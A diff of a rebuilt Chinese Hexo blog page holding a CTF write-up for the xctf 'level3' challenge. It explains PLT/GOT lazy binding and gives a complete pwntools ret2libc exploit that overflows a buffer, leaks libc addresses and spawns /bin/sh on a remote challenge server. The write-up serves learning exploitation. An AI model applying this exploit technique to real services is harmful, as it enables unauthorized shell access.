@@ -13,6 +13,8 @@
         content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
   <meta name="theme-color" content="#2f4154">
   <meta name="description" content="瞎写糊涂账">
   <meta name="author" content="renex">
@@ -52,7 +54,7 @@
 
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 4.2.1"></head>
+<meta name="generator" content="Hexo 5.3.0"></head>
 
 
 <body>
@@ -104,18 +106,6 @@
               <a class="nav-link" href="/categories/">
                 <i class="iconfont icon-category-fill"></i>
                 Categories
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                Tags
               </a>
             </li>
           
@@ -177,7 +167,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      461 字
+      487 字
     </span>
   
 
@@ -187,7 +177,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      5
+      6
        分钟
     </span>
   
@@ -222,42 +212,41 @@
             <div class="markdown-body" id="post-body">
               <p>因为自己也写博客，也有在某些自己也不懂的地方糊弄的心思，所以总感觉看的许多同质化严重的博客文章也是这样。。。以后应该提升一下博客质量。。</p>
 <hr>
-<p>level3(xctf)<br>被plt-got表这一块困扰了很久，结果发现一直没有理解的是pwntools里面的elf.got函数。。<br>首先是一篇讲解很详细的参考文章<br> <a href="https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html" target="_blank" rel="noopener">深入了解GOT,PLT和动态链接</a></p>
+<p>level3(xctf)<br>被plt-got表这一块困扰了很久，结果发现一直没有理解的是pwntools里面的elf.got函数。。<br>首先是一篇讲解很详细的参考文章<br> <a target="_blank" rel="noopener" href="https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html">深入了解GOT,PLT和动态链接</a></p>
 <p>总结一下就是：<br>.plt表指向.got.plt表，由于延迟绑定，.got.plt在函数调用之前指向.plt表，在函数调用之后才写入外部函数具体地址</p>
 <p>再就是我一直理解错了的pwntools工具的elf.plt，elf.got函数，两者返回的是.plt表和.got.plt表的地址，而不是其存储的地址。。</p>
 <p>题目的具体思路就是：由于level3中没有system以及字符串/bin/sh，需要在给出的libc_32.so.6中寻找。要调用外部函数需要获得其地址。由于外部函数的偏移量是固定的，可以通过泄露write函数的地址来得到偏移。同时返回main函数二次利用漏洞避免外部函数偏移量改变。</p>
-<div class="hljs"><pre><code class="hljs lua">from pwn import *
-<span class="hljs-built_in">io</span> = remote(<span class="hljs-string">"220.249.52.133"</span>,<span class="hljs-number">42977</span>)
+<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *
+<span class="hljs-attribute">io</span> = remote(<span class="hljs-string">&quot;220.249.52.133&quot;</span>,<span class="hljs-number">42977</span>)
 
-level3 = ELF(<span class="hljs-string">"level3"</span>)
-libc = ELF(<span class="hljs-string">"libc_32.so.6"</span>)
+<span class="hljs-attribute">level3</span> = ELF(<span class="hljs-string">&quot;level3&quot;</span>)
+<span class="hljs-attribute">libc</span> = ELF(<span class="hljs-string">&quot;libc_32.so.6&quot;</span>)
 
-write_plt_addr = level3.plt[<span class="hljs-string">'write'</span>]
-write_got_plt_addr = level3.got[<span class="hljs-string">'write'</span>]
-<span class="hljs-built_in">print</span>(hex(write_got_plt_addr))
+<span class="hljs-attribute">write_plt_addr</span> = level<span class="hljs-number">3</span>.plt[&#x27;write&#x27;]
+<span class="hljs-attribute">write_got_plt_addr</span> = level<span class="hljs-number">3</span>.got[&#x27;write&#x27;]
+<span class="hljs-attribute">print</span>(hex(write_got_plt_addr))
 
-main_addr = level3.symbols[<span class="hljs-string">'main'</span>]
+<span class="hljs-attribute">main_addr</span> = level<span class="hljs-number">3</span>.symbols[&#x27;main&#x27;]
 
-#返回<span class="hljs-built_in">write</span>的plt表地址，参数分别为<span class="hljs-number">1</span>、write_got_plt_addr、<span class="hljs-number">4</span>，<span class="hljs-number">1</span>表示<span class="hljs-built_in">stdout</span>，即把.got.plt表的内容写入标准输出
-payload = <span class="hljs-string">'a'</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">0x04</span>) + p32(write_plt_addr) + p32(main_addr) + p32(<span class="hljs-number">1</span>) + p32(write_got_plt_addr) + p32(<span class="hljs-number">4</span>)
+<span class="hljs-comment">#返回write的plt表地址，参数分别为1、write_got_plt_addr、4，1表示stdout，即把.got.plt表的内容写入标准输出</span>
+<span class="hljs-attribute">payload</span> = &#x27;a&#x27;*(<span class="hljs-number">0</span>x<span class="hljs-number">88</span>+<span class="hljs-number">0</span>x<span class="hljs-number">04</span>) + p<span class="hljs-number">32</span>(write_plt_addr) + p<span class="hljs-number">32</span>(main_addr) + p<span class="hljs-number">32</span>(<span class="hljs-number">1</span>) + p<span class="hljs-number">32</span>(write_got_plt_addr) + p<span class="hljs-number">32</span>(<span class="hljs-number">4</span>)
 
-<span class="hljs-built_in">io</span>.sendlineafter(<span class="hljs-string">'Input:\n'</span>,payload)
+<span class="hljs-attribute">io</span>.sendlineafter(&#x27;Input:\n&#x27;,payload)
 
-#收到标准输出的内容就是<span class="hljs-built_in">write</span>函数的真实地址
-write_got_addr = u32(<span class="hljs-built_in">io</span>.recv())
+<span class="hljs-comment">#收到标准输出的内容就是write函数的真实地址</span>
+<span class="hljs-attribute">write_got_addr</span> = u<span class="hljs-number">32</span>(io.recv())
 
-<span class="hljs-built_in">print</span>(hex(write_got_addr))
+<span class="hljs-attribute">print</span>(hex(write_got_addr))
 
-offset = write_got_addr - libc.symbols[<span class="hljs-string">'write'</span>]
+<span class="hljs-attribute">offset</span> = write_got_addr - libc.symbols[&#x27;write&#x27;]
 
-sys_addr = offset + libc.symbols[<span class="hljs-string">'system'</span>]
-bin_sh_addr = offset + libc.search(<span class="hljs-string">'/bin/sh'</span>).<span class="hljs-built_in">next</span>()
+<span class="hljs-attribute">sys_addr</span> = offset + libc.symbols[&#x27;system&#x27;]
+<span class="hljs-attribute">bin_sh_addr</span> = offset + libc.search(&#x27;/bin/sh&#x27;).next()
 
-payload = <span class="hljs-string">'a'</span> * (<span class="hljs-number">0x88</span>+<span class="hljs-number">0x04</span>) + p32(sys_addr) + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(bin_sh_addr)
+<span class="hljs-attribute">payload</span> = &#x27;a&#x27; * (<span class="hljs-number">0</span>x<span class="hljs-number">88</span>+<span class="hljs-number">0</span>x<span class="hljs-number">04</span>) + p<span class="hljs-number">32</span>(sys_addr) + p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>xdeadbeef) + p<span class="hljs-number">32</span>(bin_sh_addr)
 
-<span class="hljs-built_in">io</span>.sendlineafter(<span class="hljs-string">'Input:\n'</span>,payload)
-<span class="hljs-built_in">io</span>.interactive()</code></pre></div>
-
+<span class="hljs-attribute">io</span>.sendlineafter(&#x27;Input:\n&#x27;,payload)
+<span class="hljs-attribute">io</span>.interactive()</code></pre></div>
             </div>
             <hr>
             <div>
@@ -273,7 +262,7 @@ payload = <span class="hljs-string">'a'</span> * (<span class="hljs-number">0x88
                 
               </div>
               
-                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
               
               
                 <div class="post-prevnext row">
@@ -495,6 +484,45 @@ payload = <span class="hljs-string">'a'</span> * (<span class="hljs-number">0x88
 
 
 
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js" ></script>
+
+  
 
 
 
